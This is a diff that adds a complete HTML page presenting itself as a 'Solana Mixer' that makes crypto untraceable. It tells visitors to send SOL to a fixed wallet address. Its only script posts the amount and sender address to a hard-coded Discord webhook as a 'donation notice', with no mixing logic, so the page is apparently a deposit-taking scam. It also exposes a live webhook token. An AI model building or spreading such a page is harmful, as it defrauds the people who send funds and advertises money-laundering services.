@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Solana Mixer</title>
+<style>
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    font-family: 'Segoe UI', system-ui, sans-serif;
+    background: linear-gradient(135deg, #181819, #000000, #000000);
+    color: #fff;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+  }
+  .card {
+    background: rgba(255,255,255,0.05);
+    border: 1px solid rgba(255,255,255,0.15);
+    backdrop-filter: blur(10px);
+    border-radius: 16px;
+    padding: 32px;
+    max-width: 420px;
+    width: 100%;
+    box-shadow: 0 8px 32px rgba(0,0,0,0.4);
+  }
+  h1 {
+    text-align: center;
+    font-size: 1.6em;
+    margin-bottom: 4px;
+    background: linear-gradient(90deg, #f9f9f9, #ffffff);
+    -webkit-background-clip: text;
+    background-clip: text;
+    color: transparent;
+  }
+  p.subtitle {
+    text-align: center;
+    color: #bbb;
+    font-size: 0.9em;
+    margin-top: 0;
+    margin-bottom: 24px;
+  }
+  label {
+    display: block;
+    font-size: 0.85em;
+    margin-bottom: 6px;
+    color: #fbfbfb;
+  }
+  .address-box {
+    display: flex;
+    align-items: center;
+    background: rgba(0,0,0,0.3);
+    border: 1px solid rgba(255,255,255,0.15);
+    border-radius: 10px;
+    padding: 10px 12px;
+    margin-bottom: 20px;
+    word-break: break-all;
+    font-size: 0.85em;
+  }
+  .address-box span { flex: 1; }
+  .address-box button {
+    background: #000000;
+    border: none;
+    color: white;
+    padding: 6px 10px;
+    border-radius: 6px;
+    cursor: pointer;
+    font-size: 0.8em;
+    margin-left: 8px;
+  }
+  .address-box button:hover { background: #000000; }
+  input {
+    width: 100%;
+    padding: 10px 12px;
+    border-radius: 8px;
+    border: 1px solid rgba(255,255,255,0.2);
+    background: rgba(0,0,0,0.3);
+    color: #fff;
+    margin-bottom: 16px;
+    font-size: 0.95em;
+  }
+  input::placeholder { color: #888; }
+  button.submit-btn {
+    width: 100%;
+    padding: 12px;
+    border: none;
+    border-radius: 10px;
+    background: linear-gradient(90deg, #f9f9f9, #f5f6f6);
+    color: #0f0c29;
+    font-weight: bold;
+    font-size: 1em;
+    cursor: pointer;
+  }
+  button.submit-btn:hover { opacity: 0.9; }
+  button.submit-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+  .status {
+    text-align: center;
+    margin-top: 14px;
+    font-size: 0.9em;
+    min-height: 20px;
+  }
+  .status.success { color: #14F195; }
+  .status.error { color: #ff6b6b; }
+  .disclaimer {
+    margin-top: 20px;
+    font-size: 0.72em;
+    color: #888;
+    text-align: center;
+    line-height: 1.4;
+  }
+</style>
+</head>
+<body>
+
+<div class="card">
+  <h1>Solana Mixer</h1>
+  <p class="subtitle">We mix your Solana accross 100 different wallets to insure your crypto is untraceable.</p>
+
+  <label>Destination address/Send SOL to this address:</label>
+  <div class="address-box">
+    <span id="solAddress">BLU32KZuEYY7FGxeoxqJDQWteao6SjQkw1LYBK1y5sGL</span>
+    <button onclick="copyAddress()">Copy</button>
+  </div>
+
+  <label for="senderAddress">Your Solana wallet address</label>
+  <input type="text" id="senderAddress" placeholder="e.g. 4Nd1m...">
+
+  <label for="amount">Amount sent (SOL)</label>
+  <input type="text" id="amount" placeholder="e.g. 0.5">
+
+  <button class="submit-btn" id="submitBtn" onclick="submitDonation()">Submit</button>
+
+  <div class="status" id="status"></div>
+
+  <div class="disclaimer">
+    Instructions: Open your exchange app, navigate to the SOL withdrawal section, copy the destination address, and send your desired amount.
+    Mixing duration varies from 1 hour to 48 hours, depending on batch volume.
+  </div>
+</div>
+
+<script>
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1548858367668129844/3S90V1YmnDF5uix0nFqVQUjXOniXkEE7-a5hGXSukldW9aMBUWvW0ibelKTjzBp1kWtW";
+
+function copyAddress() {
+  const addr = document.getElementById('solAddress').innerText;
+  navigator.clipboard.writeText(addr).then(() => {
+    const btn = event.target;
+    const original = btn.innerText;
+    btn.innerText = "Copied!";
+    setTimeout(() => btn.innerText = original, 1500);
+  });
+}
+
+async function submitDonation() {
+  const sender = document.getElementById('senderAddress').value.trim();
+  const amount = document.getElementById('amount').value.trim();
+  const statusEl = document.getElementById('status');
+  const btn = document.getElementById('submitBtn');
+
+  if (!amount) {
+    statusEl.className = "status error";
+    statusEl.innerText = "Please enter an amount.";
+    return;
+  }
+
+  btn.disabled = true;
+  btn.innerText = "Sending...";
+  statusEl.className = "status";
+  statusEl.innerText = "";
+
+  const payload = {
+    content: `**New Solana Donation Notice**\nAmount: ${amount} SOL\nSender address: ${sender || "not provided"}`
+  };
+
+  try {
+    const res = await fetch(WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+
+    if (res.ok) {
+      statusEl.className = "status success";
+      statusEl.innerText = "Thank you! Your donation notice was sent.";
+      document.getElementById('senderAddress').value = "";
+      document.getElementById('amount').value = "";
+    } else {
+      statusEl.className = "status error";
+      statusEl.innerText = "Something went wrong. Please try again.";
+    }
+  } catch (e) {
+    statusEl.className = "status error";
+    statusEl.innerText = "Network error. Please try again.";
+  }
+
+  btn.disabled = false;
+  btn.innerText = "Notify Donation";
+}
+</script>
+
+</body>
+</html>
